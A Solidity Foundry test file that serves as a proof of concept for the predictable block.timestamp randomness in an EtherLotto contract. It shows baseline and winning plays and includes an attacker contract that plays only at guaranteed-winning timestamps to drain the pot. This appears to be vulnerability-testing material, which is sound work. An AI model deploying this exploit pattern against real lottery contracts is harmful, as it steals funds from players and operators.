// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/ether_lotto.sol";

/// @title Exploit for the time-based (bad) randomness in EtherLotto.
/// @notice EtherLotto derives its "random" outcome from block.timestamp.
///         Because block.timestamp is controlled by the miner and is fully
///         predictable inside a contract, an attacker can pick a timestamp
///         that makes `random == 0` and always win the whole pot.
contract EtherLottoRandomnessTest is Test {
    EtherLotto internal lotto;
    address internal bank = address(0xB0B);
    address internal attacker = address(0xBAD);

    uint256 internal constant SEED_POT = 10 ether;

    struct LottoSnapshot {
        uint256 pot;
        uint256 totalWinners;
        uint256 totalGames;
        uint256 playerWins;
        address bank;
        uint256 playerBalance;
        uint256 lottoBalance;
    }

    function setUp() public {
        vm.deal(bank, 100 ether);
        vm.deal(attacker, 100 ether);

        // bank deploys the lottery, so constructor sets bank = msg.sender.
        vm.prank(bank);
        lotto = new EtherLotto();

        // Seed the pot so that winning is highly profitable for the attacker.
        vm.prank(bank);
        lotto.addToPot{value: SEED_POT}();
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    /// @dev Reads the ticket price. Tries the auto getter first (works when
    ///      the constant is declared `public`), otherwise falls back to the
    ///      classic EtherLotto value (10 wei).
    function _ticketAmount() internal view returns (uint256) {
        (bool ok, bytes memory ret) =
            address(lotto).staticcall(abi.encodeWithSignature("TICKET_AMOUNT()"));
        if (ok && ret.length >= 32) {
            uint256 v = abi.decode(ret, (uint256));
            if (v != 0) return v;
        }
        return 10;
    }

    /// @dev Mirrors exactly the contract's randomness formula.
    function _winsAt(uint256 ts) internal pure returns (bool) {
        return uint256(keccak256(abi.encodePacked(ts))) % 2 == 0;
    }

    function _findWinningTimestamp() internal view returns (uint256) {
        for (uint256 ts = block.timestamp; ts < block.timestamp + 1000; ++ts) {
            if (_winsAt(ts)) return ts;
        }
        revert("no winning timestamp found");
    }

    function _findLosingTimestamp() internal view returns (uint256) {
        for (uint256 ts = block.timestamp; ts < block.timestamp + 1000; ++ts) {
            if (!_winsAt(ts)) return ts;
        }
        revert("no losing timestamp found");
    }

    function _snapshot(address player) internal view returns (LottoSnapshot memory s) {
        s.pot = lotto.pot();
        s.totalWinners = lotto.totalWinners();
        s.totalGames = lotto.totalGames();
        s.playerWins = lotto.playerWins(player);
        s.bank = lotto.bank();
        s.playerBalance = player.balance;
        s.lottoBalance = address(lotto).balance;
    }

    function _logSnapshot(string memory label, LottoSnapshot memory s) internal pure {
        console.log(label);
        console.log("  pot:", s.pot);
        console.log("  totalWinners:", s.totalWinners);
        console.log("  totalGames:", s.totalGames);
        console.log("  playerWins:", s.playerWins);
        console.log("  bank:", s.bank);
        console.log("  playerBalance:", s.playerBalance);
        console.log("  lottoBalance:", s.lottoBalance);
    }

    // ------------------------------------------------------------------
    // Baseline: at an unlucky timestamp the player simply loses the ticket.
    // ------------------------------------------------------------------

    function testAttackerLosesAtUnfavorableTimestamp() public {
        uint256 ticket = _ticketAmount();

        uint256 ts = _findLosingTimestamp();
        vm.warp(ts);
        assertFalse(_winsAt(ts), "sanity: timestamp must be a losing one");

        uint256 balBefore = attacker.balance;

        vm.prank(attacker);
        lotto.play{value: ticket}();

        // Player paid the ticket and got nothing back.
        assertEq(attacker.balance, balBefore - ticket, "attacker should only lose the ticket");
        // The whole ticket is now sitting in the pot.
        assertEq(address(lotto).balance, SEED_POT + ticket, "pot should grow by the ticket");
    }

    // ------------------------------------------------------------------
    // Exploit: the attacker (miner) selects a favorable timestamp and wins.
    // ------------------------------------------------------------------

    function testAttackerWinsByChoosingFavorableTimestamp() public {
        uint256 ticket = _ticketAmount();

        // A malicious miner can compute this offline and pick it for the block.
        uint256 ts = _findWinningTimestamp();
        vm.warp(ts);
        assertTrue(_winsAt(ts), "sanity: timestamp must be a winning one");

        uint256 balBefore = attacker.balance;

        vm.prank(attacker);
        lotto.play{value: ticket}();

        // One lucky timestamp and the attacker walks away with the whole pot.
        assertGt(attacker.balance, balBefore, "attacker should profit from the pot");
        assertEq(address(lotto).balance, 0, "the pot is fully drained");
    }

    // ------------------------------------------------------------------
    // Strongest PoC: a smart contract checks block.timestamp and only plays
    // when it is guaranteed to win. No miner needed - the "randomness" is
    // entirely predictable / controllable from within the transaction.
    //
    // Differential validation:
    // 1. Losing timestamp baseline: pot grows, win counters do not move.
    // 2. Winning timestamp EOA play: pot drains, win counters increment.
    // 3. Winning timestamp smart-contract gambler: same exploit, no miner.
    // ------------------------------------------------------------------

    function testSmartContractGamblerAlwaysWins() public {
        uint256 ticket = _ticketAmount();

        console.log("========== BASELINE: losing timestamp ==========");
        uint256 losingTs = _findLosingTimestamp();
        vm.warp(losingTs);
        require(!_winsAt(losingTs), "sanity: timestamp must be a losing one");

        LottoSnapshot memory baselineBefore = _snapshot(attacker);
        console.log("[BEFORE] attacker play at losing timestamp");
        _logSnapshot("baselineBefore", baselineBefore);

        console.log("[TRIGGER] attacker.play at losing timestamp");
        vm.prank(attacker);
        lotto.play{value: ticket}();

        LottoSnapshot memory baselineAfter = _snapshot(attacker);
        console.log("[AFTER] attacker play at losing timestamp");
        _logSnapshot("baselineAfter", baselineAfter);

        bool baselineLost = baselineAfter.pot == baselineBefore.pot + ticket
            && baselineAfter.totalGames == baselineBefore.totalGames + 1
            && baselineAfter.totalWinners == baselineBefore.totalWinners
            && baselineAfter.playerWins == baselineBefore.playerWins
            && baselineAfter.playerBalance == baselineBefore.playerBalance - ticket
            && baselineAfter.lottoBalance == baselineBefore.lottoBalance + ticket;
        console.log("Baseline losing-play matches expected non-win behavior:", baselineLost);

        console.log("========== EXPLOIT: EOA at winning timestamp ==========");
        uint256 winningTs = _findWinningTimestamp();
        vm.warp(winningTs);
        require(_winsAt(winningTs), "sanity: timestamp must be a winning one");

        LottoSnapshot memory eoaBefore = _snapshot(attacker);
        console.log("[BEFORE] attacker play at winning timestamp");
        _logSnapshot("eoaBefore", eoaBefore);

        console.log("[TRIGGER] attacker.play at winning timestamp");
        vm.prank(attacker);
        lotto.play{value: ticket}();

        LottoSnapshot memory eoaAfter = _snapshot(attacker);
        console.log("[AFTER] attacker play at winning timestamp");
        _logSnapshot("eoaAfter", eoaAfter);

        bool eoaWon = eoaAfter.pot == 0
            && eoaAfter.pot < eoaBefore.pot
            && eoaAfter.totalWinners == eoaBefore.totalWinners + 1
            && eoaAfter.totalGames == eoaBefore.totalGames + 1
            && eoaAfter.playerWins == eoaBefore.playerWins + 1
            && eoaAfter.playerBalance > eoaBefore.playerBalance
            && eoaAfter.lottoBalance == 0
            && eoaAfter.bank == eoaBefore.bank;
        console.log("EOA winning-play drained pot and incremented win counters:", eoaWon);

        console.log("========== EXPLOIT: smart-contract gambler at winning timestamp ==========");
        vm.prank(bank);
        lotto.addToPot{value: SEED_POT}();

        TimestampGambler gambler = new TimestampGambler(lotto, ticket);
        vm.deal(address(gambler), ticket);

        uint256 gamblerWinTs = _findWinningTimestamp();
        vm.warp(gamblerWinTs);
        require(_winsAt(gamblerWinTs), "sanity: gambler timestamp must be a winning one");

        LottoSnapshot memory gamblerBefore = _snapshot(address(gambler));
        console.log("[BEFORE] gambler.attack at winning timestamp");
        _logSnapshot("gamblerBefore", gamblerBefore);

        console.log("[TRIGGER] gambler.attack");
        gambler.attack();

        LottoSnapshot memory gamblerAfter = _snapshot(address(gambler));
        console.log("[AFTER] gambler.attack at winning timestamp");
        _logSnapshot("gamblerAfter", gamblerAfter);

        bool gamblerWon = gamblerAfter.pot == 0
            && gamblerAfter.pot < gamblerBefore.pot
            && gamblerAfter.totalWinners == gamblerBefore.totalWinners + 1
            && gamblerAfter.totalGames == gamblerBefore.totalGames + 1
            && gamblerAfter.playerWins == gamblerBefore.playerWins + 1
            && gamblerAfter.playerBalance > gamblerBefore.playerBalance
            && gamblerAfter.lottoBalance == 0
            && gamblerAfter.bank == gamblerBefore.bank;
        console.log("Smart-contract gambler drained pot and incremented win counters:", gamblerWon);

        bool exploitSucceeded = baselineLost && eoaWon && gamblerWon;
        console.log("========== VERDICT ==========");

        if (exploitSucceeded) {
            console.log("Vulnerability Exists: block.timestamp-based randomness allows choosing a winning timestamp; the winning play drains the pot and increments totalWinners/playerWins.");
        } else {
            console.log("Vulnerability not Exist: the before/after snapshots did not show the expected pot drain and win-counter increments.");
        }
    }
}

/// @dev Helper that only plays when `keccak256(block.timestamp) % 2 == 0`,
///      i.e. when the outcome is already known to be a win.
contract TimestampGambler {
    EtherLotto private lotto;
    uint256 private ticket;

    constructor(EtherLotto _lotto, uint256 _ticket) {
        lotto = _lotto;
        ticket = _ticket;
    }

    function attack() external {
        require(
            uint256(keccak256(abi.encodePacked(block.timestamp))) % 2 == 0,
            "not a winning block"
        );
        lotto.play{value: ticket}();
    }

    receive() external payable {}
}